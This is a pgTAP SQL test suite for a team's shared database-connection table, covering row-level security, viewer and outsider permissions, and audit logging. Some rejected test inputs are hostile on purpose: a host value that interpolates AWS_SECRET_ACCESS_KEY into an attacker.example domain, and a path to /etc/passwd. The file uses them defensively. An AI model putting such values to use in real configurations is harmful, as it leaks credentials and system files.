begin;
create extension if not exists pgtap with schema extensions;
select plan(11);

insert into auth.users (id, email, email_confirmed_at, raw_user_meta_data, aud, role)
values
  ('11111111-1111-1111-1111-111111111111', 'ana@relay.test', now(), '{}', 'authenticated', 'authenticated'),
  ('22222222-2222-2222-2222-222222222222', 'vic@relay.test', now(), '{}', 'authenticated', 'authenticated'),
  ('33333333-3333-3333-3333-333333333333', 'cy@relay.test', now(), '{}', 'authenticated', 'authenticated');

create function pg_temp.act_as(who uuid) returns void language sql as $$
  select set_config('role', 'authenticated', true),
         set_config('request.jwt.claims', json_build_object('sub', who, 'role', 'authenticated', 'aal', 'aal1')::text, true)
$$;

select pg_temp.act_as('11111111-1111-1111-1111-111111111111');
create temp table ws on commit drop as select public.create_team('Acme') as id;
grant select on ws to authenticated;
reset role;
insert into public.members (team_id, user_id, role)
select id, '22222222-2222-2222-2222-222222222222', 'viewer' from ws;

select pg_temp.act_as('11111111-1111-1111-1111-111111111111');
select lives_ok($$
  insert into public.connections (team_id, name, kind, environment, definition)
  values ((select id from ws), 'ERP prod', 'postgresql', 'Production',
          '{"host": "db.corp", "port": 5432, "database": "erp", "user": "relay"}')
$$, 'a member adds a connection to the team');
select throws_ok($$
  insert into public.connections (team_id, name, kind, environment, definition)
  values ((select id from ws), 'Leak', 'postgresql', 'Production', '{"host": "db", "password": "hunter2"}')
$$, '23514', null, 'a password can never be stored with a connection');
select throws_ok($$
  insert into public.connections (team_id, name, kind, environment, definition)
  values ((select id from ws), 'Peek', 'sqlite', 'Test', '{"path": "/etc/passwd"}')
$$, '23514', null, 'a file path stays on each computer, never in the shared definition');
select throws_ok($$
  insert into public.connections (team_id, name, kind, environment, definition)
  values ((select id from ws), 'Exfil', 'postgresql', 'Test', '{"host": "${AWS_SECRET_ACCESS_KEY}.attacker.example"}')
$$, '23514', null, 'a shared definition never reads a variable of the computer that uses it');
select is((select action from public.audit_log order by id desc limit 1), 'connection.created',
  'adding a connection is in the audit log');

select pg_temp.act_as('22222222-2222-2222-2222-222222222222');
select is((select definition ->> 'host' from public.connections), 'db.corp',
  'a teammate sees the connection the team shares');
select throws_ok($$
  insert into public.connections (team_id, name, kind, environment)
  values ((select id from ws), 'Mine', 'mysql', 'Test')
$$, '42501', null, 'a viewer cannot add a connection');
update public.connections set name = 'renamed';
select is((select name from public.connections), 'ERP prod', 'a viewer cannot change a connection');

select pg_temp.act_as('33333333-3333-3333-3333-333333333333');
select is((select count(*)::int from public.connections), 0, 'an outsider sees no connection');
delete from public.connections;

select pg_temp.act_as('11111111-1111-1111-1111-111111111111');
select is((select count(*)::int from public.connections), 1, 'an outsider cannot remove a connection');
delete from public.connections;
select is((select count(*)::int from public.connections), 0, 'a member removes a connection');

select * from finish();
rollback;
